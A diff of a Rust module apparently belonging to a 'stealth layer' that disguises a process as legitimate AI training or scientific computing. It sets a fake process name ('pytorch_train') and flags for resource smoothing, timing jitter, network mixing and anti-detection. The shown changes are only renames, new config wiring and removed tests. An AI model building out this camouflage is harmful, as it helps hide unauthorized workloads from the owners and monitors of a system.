@@ -4,17 +4,36 @@
 //! **legitimate workloads** (khối công việc hợp pháp) như AI Training, Image Processing,
 //! Scientific Computing, và AI Inference.
 
+pub mod config;
+pub mod profile_manager;
 pub mod wrappers;
 pub mod resource_camouflage;
 pub mod anti_detection;
 
-use anyhow::Result;
+// Re-export main types và functions
+pub use config::{StealthConfig, load_config};
+pub use profile_manager::ProfileManager;
+
+/// Create stealth manager với default configuration
+pub fn create_stealth_manager() -> Result<ProfileManager> {
+    let config = load_config()?;
+    ProfileManager::new(config)
+}
+
+/// Create stealth manager with default configuration (mutable version for tests)
+pub fn create_stealth_manager_mut() -> ProfileManager {
+    let config = StealthConfig::default();
+    ProfileManager::new(config).unwrap()
+}
+
+/// Legacy compatibility types kept for backward compatibility
 use serde::{Deserialize, Serialize};
 use tracing::{info, debug};
+use anyhow::Result;
 
-/// **StealthProfile** (hồ sơ ẩn danh) – loại ngụy trang
+/// **StealthProfile** (hồ sơ ẩn danh) – loại ngụy trang (legacy enum for compatibility)
 #[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
-pub enum StealthProfile {
+pub enum StealthProfileLegacy {
     /// **AI Training** (đào tạo AI) – giả lập huấn luyện mô hình
     AiTraining,
 
@@ -28,11 +47,11 @@ pub enum StealthProfile {
     AiInference,
 }
 
-/// **StealthConfig** (cấu hình ẩn danh) – thiết lập ngụy trang
+/// **StealthConfig** (cấu hình ẩn danh) – thiết lập ngụy trang (legacy for compatibility)
 #[derive(Debug, Clone, Serialize, Deserialize)]
-pub struct StealthConfig {
+pub struct StealthConfigLegacy {
     /// **Profile** (hồ sơ) – loại ngụy trang sử dụng
-    pub profile: StealthProfile,
+    pub profile: StealthProfileLegacy,
 
     /// **Process name** (tên tiến trình) – tên hiển thị trong ps/top
     pub process_name: String,
@@ -47,10 +66,10 @@ pub struct StealthConfig {
     pub enable_network_mixing: bool,
 }
 
-impl Default for StealthConfig {
+impl Default for StealthConfigLegacy {
     fn default() -> Self {
         Self {
-            profile: StealthProfile::AiTraining,
+            profile: StealthProfileLegacy::AiTraining,
             process_name: "pytorch_train".to_string(),
             enable_resource_smoothing: true,
             enable_timing_jitter: true,
@@ -59,14 +78,14 @@ impl Default for StealthConfig {
     }
 }
 
-/// **StealthManager** (trình quản lý ẩn danh) – điều phối ngụy trang
-pub struct StealthManager {
-    config: StealthConfig,
+/// **StealthManager** (trình quản lý ẩn danh) – điều phối ngụy trang (legacy compatibility)
+pub struct StealthManagerLegacy {
+    config: StealthConfigLegacy,
 }
 
-impl StealthManager {
+impl StealthManagerLegacy {
     /// **Create new stealth manager** (tạo trình quản lý mới)
-    pub fn new(config: StealthConfig) -> Result<Self> {
+    pub fn new(config: StealthConfigLegacy) -> Result<Self> {
         info!("🥷 Initializing stealth layer with profile: {:?}", config.profile);
         Ok(Self { config })
     }
@@ -137,52 +156,9 @@ impl StealthManager {
     }
 
     /// **Get current profile** (lấy hồ sơ hiện tại)
-    pub fn profile(&self) -> StealthProfile {
+    pub fn profile(&self) -> StealthProfileLegacy {
         self.config.profile
     }
 }
 
-#[cfg(test)]
-mod tests {
-    use super::*;
-
-    #[test]
-    fn test_stealth_config_default() {
-        let config = StealthConfig::default();
-        assert_eq!(config.profile, StealthProfile::AiTraining);
-        assert!(config.enable_resource_smoothing);
-        assert!(config.enable_timing_jitter);
-        assert!(config.enable_network_mixing);
-    }
-
-    #[tokio::test]
-    async fn test_stealth_manager_lifecycle() {
-        let config = StealthConfig::default();
-        let manager = StealthManager::new(config).unwrap();
-
-        // Should activate without errors (phải kích hoạt không lỗi)
-        assert!(manager.activate().await.is_ok());
-
-        // Should deactivate without errors (phải hủy kích hoạt không lỗi)
-        assert!(manager.deactivate().await.is_ok());
-    }
-
-    #[test]
-    fn test_stealth_profiles() {
-        let profiles = vec![
-            StealthProfile::AiTraining,
-            StealthProfile::ImageProcessing,
-            StealthProfile::ScientificComputing,
-            StealthProfile::AiInference,
-        ];
-
-        for profile in profiles {
-            let config = StealthConfig {
-                profile,
-                ..Default::default()
-            };
-            let manager = StealthManager::new(config).unwrap();
-            assert_eq!(manager.profile(), profile);
-        }
-    }
-}
+// Tests for ProfileManager and new config are in respective modules
